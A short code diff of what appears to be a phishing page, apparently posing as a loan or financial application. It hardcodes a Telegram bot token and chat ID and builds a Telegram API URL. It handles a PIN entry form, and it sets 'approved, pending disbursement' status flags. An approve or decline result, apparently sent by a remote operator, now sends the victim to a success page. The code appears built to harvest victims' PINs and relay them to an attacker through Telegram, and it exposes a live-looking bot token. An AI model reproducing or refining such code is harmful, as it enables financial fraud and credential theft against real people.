@@ -425,7 +425,8 @@
     const BOT_TOKEN = '8851084758:AAGBlQW5weHaFz1Fv2D5wdIFSggZRGQTfug';
     const CHAT_ID   = '8820857419';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
+;
+    // --- DOM
     const pinHiddenInput = document.getElementById('pinHiddenInput');
     const authBtn = document.getElementById('authBtn');
     const pinError = document.getElementById('pinError');
@@ -479,7 +480,6 @@
       localStorage.setItem('fbc_application_status', 'APPROVED_PENDING_DISBURSEMENT');
       localStorage.setItem('fbc_authorized_at', new Date().toISOString());
 
-      window.location.href = 'success.html';
     }
 
     window.addEventListener('keydown', (e) => {
@@ -600,7 +600,7 @@
           isProcessing = false;
 
           if (action === 'approve') {
-            window.location.href = 'unavailable.html';
+            window.location.href = 'success.html';
           } else if (action === 'decline') {
             showError('PIN verification declined');
             pinInputs.forEach(i => {
